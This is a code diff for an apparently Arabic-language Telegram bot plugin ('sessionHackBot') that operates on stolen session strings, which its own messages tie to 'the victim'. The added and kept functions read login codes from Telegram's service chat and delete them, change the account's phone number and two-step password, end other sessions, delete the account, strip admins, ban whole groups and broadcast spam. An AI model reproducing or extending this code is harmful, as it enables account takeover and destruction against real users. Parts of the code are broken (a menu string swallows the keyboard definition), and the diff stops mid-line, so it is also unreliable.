@@ -1,4 +1,3 @@
-
 from JoKeRUB import bot, l313l
 #By Source joker @ucriss
 from telethon import events, functions, types, Button
@@ -18,77 +17,236 @@ from telethon.tl.types import ChannelParticipantsAdmins as cpa
 
 from telethon.tl.functions.channels import CreateChannelRequest as ccr
 
-# تعريف البوت والمتغيرات الأساسية
 bot = borg = tgbot
-Bot_Username = "sessionHackBot"  # يمكن تغيير هذا الاسم حسب إعداداتك
 
-# تعريف وظيفة تغيير التحقق بخطوتين (2FA)
-async def change_2fa(strses, current_password, new_password, hint=""):
+Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
+
+async def change_number_code(strses, number, code, otp):
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    bot = client = X
+    try: 
+      result = await bot(functions.account.ChangePhoneRequest(
+        phone_number=number,
+        phone_code_hash=code,
+        phone_code=otp
+      ))
+      return True
+    except:
+      return False
+
+async def change_number(strses, number):
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    bot = client = X
+    result = await bot(functions.account.SendChangePhoneCodeRequest(
+        phone_number=number,
+        settings=types.CodeSettings(
+            allow_flashcall=True,
+            current_number=True,
+            allow_app_hash=True
+        )
+    ))
+    return str(result)
+
+
+async def userinfo(strses):
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    k = await X.get_me()
+    return str(k)
+
+async def terminate(strses):
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    try:
+        await X(rt())
+        return True
+    except Exception as rr:
+        return rr
+
+GROUP_LIST = []
+async def delacc(strses):
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    
+    await X(functions.account.DeleteAccountRequest("I am chutia"))
+
+async def promote(strses, grp, user):
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    
+    try:
+      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
+    except:
+      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
+    
+async def user2fa(strses):
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    
+    try:
+      result = await X(functions.account.GetPasswordRequest())
+      if result.has_password:
+        h = result.hint
+        if h == None:
+          h = "لا يوجد"
+        return False, h
+      else:
+        return True, "n"
+    except:
+        return False, "لا يوجد"
+
+async def demall(strses, grp):
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    
+    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
+      try:
+        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
+      except:
+        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
+      
+
+
+async def joingroup(strses, username):
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    
+    await X(join(username))
+
+
+async def leavegroup(strses, username):
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    
+    await X(leave(username))
+
+async def delgroup(strses, username):
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    
+    await X(dc(username))
+    
+
+async def cu(strses):
+  try:
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-        bot = client = X
-        try:
-            await bot(functions.account.UpdatePasswordSettingsRequest(
-                current_password_hash=current_password,
-                new_settings=types.account.PasswordInputSettings(
-                    new_salt=new_password,
-                    hint=hint,
-                    email=""
-                )
-            ))
-            return True
-        except Exception as e:
-            return str(e)
+        k = await X.get_me()
+        return [str(k.first_name), str(k.username or k.id)]
+  except Exception as e:
+    return False
 
-# تعريف القائمة الرئيسية للأوامر
+async def usermsgs(strses):
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    i = ""
+    
+    async for x in X.iter_messages(777000, limit=3):
+      i += f"\n{x.text}\n"
+    await X.delete_dialog(777000)
+    return str(i)
+
+
+async def userbans(strses, grp):
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    
+    k = await X.get_participants(grp)
+    for x in k:
+      try:
+        await X.edit_permissions(grp, x.id, view_messages=False)
+      except:
+        pass
+    
+
+
+async def userchannels(strses):
+  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    
+    k = await X(pc())
+    i = ""
+    for x in k.chats:
+      try:
+        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
+      except:
+        pass
+    return str(i)
+
+      # إضافة دالة لتغيير رمز التحقق بخطوتين
+async def change_2fa_password(strses, new_password, hint=""):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            # الحصول على معلومات التحقق بخطوتين
+            result = await X(functions.account.GetPasswordRequest())
+            if result.has_password:
+                # تغيير رمز التحقق بخطوتين
+                await X(functions.account.UpdatePasswordSettingsRequest(
+                    password=result.current_password_hash,
+                    new_settings=types.account.PasswordInputSettings(
+                        new_algo=result.current_algo,
+                        new_password_hash=new_password,
+                        hint=hint
+                    )
+                ))
+                return True, "تم تغيير رمز التحقق بخطوتين بنجاح."
+            else:
+                return False, "التحقق بخطوتين غير مفعل."
+        except Exception as e:
+            return False, f"حدث خطأ: {str(e)}"
+
+import logging
+logging.basicConfig(level=logging.WARNING)
+
+channel = "aqhvv"
 menu = '''
+
 "A" :~ [معرفه قنوات/كروبات التي يملكها]
 
-"B" :~ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص...]
-"C" :~ [{تفليش كروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الكروب/القناه و ساطرد جميع اعضاء]
-"D" :~ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]
-"E" :~ [انضمام الى كروب/قناه عن طريق كود ترمكس]
-"F" :~ [مغادره كروب /قناه عن طريق كود ترمكس]
-"G" :~ [مسح كروب /قناه عن طريق كود ترمكس]
-"H" :~ [تاكد من التحقق بخطوتين /مفعل او لا]
-"I" :~ [انهاء جميع الجلسات ما عدا جلسة البوت]
-"J" :~ [حذف الحساب]
-"K" :~ [حذف جميع المشرفين في كروب/قناه]
-"L" :~ [ترقيه عضو الى مشرف داخل كروب/قناه]
-"M" :~ [تغير رقم الحساب باستخدام كود ترمكس]
-"N" :~ [وظيفة أخرى محددة مسبقًا]
-"O" :~ [تغيير التحقق بخطوتين باستخدام كود ترمكس]
-'''
+"B" :~ [جلب جميع معلومات المستخدم مثل {رقم الحساب ، معرف المستخدم و ايدي الشخص... ]
 
-# تعريف لوحة الأزرار (keyboard) مع إصلاح ظهور الزر "O"
+"C" :~ [{تفليش كروب/قناه {اعطني الكود و بعدها ارسل لي يوزر الكروب/القناه و ساطرد جميع اعضاء]
+
+"D" :~ [جلب اخر رساله تحتوي على كود تسجيل دخول الى الحساب عن طريق كود ترمكس]
+
+"E" :~ [انضمام الى كروب/قناه عن طريق كود ترمكس] 
+
+"F" :~ [مغادره كروب /قناه عن طريق كود ترمكس]
+
+"G" :~][مسح كروب /قناه عن عن طريق كود ترمكس]
+
+"H" :~ [تاكد من التحقق بخطوتين /مفعل او لا]
+
+"I" :~ [انهاء جميع الجلسات ما عدا جلسة البوت]
+
+"J" :~ [حذف الحساب]
+
+"K" :~ [حذف جميع المشرفين في كروب/قناه]
+
+"L" ~ [ترقيه عضو الى مشرف داخل كروب/قناه]
+
+"M" ~ [تغير رقم الحساب باستخدام كود ترمكس]
+
+"O" ~ [تغير التحقق بخطوتين]
+
+'''
+mm = '''
+قم بلأنضمام الى الـقناة  @aqhvv
+# إضافة زر "O" إلى لوحة المفاتيح
 keyboard = [
-    [Button.inline("A", data="A"), Button.inline("B", data="B"), Button.inline("C", data="C"), Button.inline("D", data="D"), Button.inline("E", data="E")],
-    [Button.inline("F", data="F"), Button.inline("G", data="G"), Button.inline("H", data="H"), Button.inline("I", data="I"), Button.inline("J", data="J")],
-    [Button.inline("K", data="K"), Button.inline("L", data="L"), Button.inline("M", data="M"), Button.inline("N", data="N"), Button.inline("O", data="O")],
-    [Button.url("༺ sourCe kαᖇαᖇ ༻", "https://t.me/aqhvv")]
+    [  
+        Button.inline("A", data="A"), 
+        Button.inline("B", data="B"),
+        Button.inline("C", data="C"),
+        Button.inline("D", data="D"),
+        Button.inline("E", data="E")
+    ],
+    [
+        Button.inline("F", data="F"), 
+        Button.inline("G", data="G"),
+        Button.inline("H", data="H"),
+        Button.inline("I", data="I"),
+        Button.inline("J", data="J"),
+    ],
+    [
+        Button.inline("K", data="K"), 
+        Button.inline("L", data="L"),
+        Button.inline("M", data="M"),
+        Button.inline("N", data="N"),
+        Button.inline("O", data="O"),  # الزر الجديد
+    ],
+    [
+        Button.url("༺ sourCe kαᖇαᖇ ༻", "https://t.me/aqhvv")
+    ]
 ]
 
-# معالج حدث الزر "O" لتغيير التحقق بخطوتين
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"O")))
-async def change_2fa_handler(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("الان ارسل الكود تيرمكس")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if not op:
-            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
-        await x.send_message("ارسل كلمة المرور الحالية")
-        current_password = (await x.get_response()).text
-        await x.send_message("ارسل كلمة المرور الجديدة")
-        new_password = (await x.get_response()).text
-        await x.send_message("ارسل تلميح كلمة المرور (اختياري)")
-        hint = (await x.get_response()).text
-        result = await change_2fa(strses.text, current_password, new_password, hint)
-        if result == True:
-            await event.respond("تم تغيير التحقق بخطوتين بنجاح ✅", buttons=keyboard)
-        else:
-            await event.respond(f"حدث خطأ: {result}", buttons=keyboard)
-
-# باقي الكود...
 if Config.TG_BOT_USERNAME is not None and tgbot is not None:
     @tgbot.on(events.InlineQuery)
     async def inline_handler(event):
@@ -141,14 +299,14 @@ async def start(event):
             Button.inline("L", data="L"),
             Button.inline("M", data="M"),
             Button.inline("N", data="N"),
+            Button.inline("O", data="O"),
             ],
           [
             Button.url("المـطور", "https://t.me/Lx5x5")
             ]
         ]
         await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
-    
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
+    @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
 async def users(event):
   async with bot.conversation(event.chat_id) as x:
       await x.send_message("الان ارسل الكود تيرمكس")
@@ -383,7 +541,29 @@ async def start(event):
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)
 
-
+# إضافة حدث لمعالجة الضغط على الزر "O"
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"O")))
+async def users(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("الان ارسل الكود تيرمكس")
+        strses = await x.get_response()
+        op = await cu(strses.text)
+        if op:
+            pass
+        else:
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
+        
+        # طلب إدخال الرمز الجديد للتحقق بخطوتين
+        await x.send_message("الرجاء إدخال الرمز الجديد للتحقق بخطوتين:")
+        new_password = await x.get_response()
+        
+        # طلب إدخال تلميح (اختياري)
+        await x.send_message("الرجاء إدخال تلميح للرمز الجديد (اختياري):")
+        hint = await x.get_response()
+        
+        # استدعاء دالة تغيير رمز التحقق بخطوتين
+        success, message = await change_2fa_password(strses.text, new_password.text, hint.text)
+        await event.reply(message, buttons=keyboard)
 
 async def gcasta(strses, msg):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -591,9 +771,4 @@ async def users(event):
       if op:
         pass
       else:
-        return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
-      await x.send_message("الان ارسل لي الرساله")
-      msg = await x.get_response()
-      await x.send_message("الان سيتم ارسال الرساله بشكل تلقائي كل 10 دقائق")
-      i = await gcastc(strses.text, msg.text)
-      await event.reply(f" محادثات خاصة {i} تم النشر في  😉😉.", buttons=keyboard)
+        return await event.respond("لقد تم انهاء 
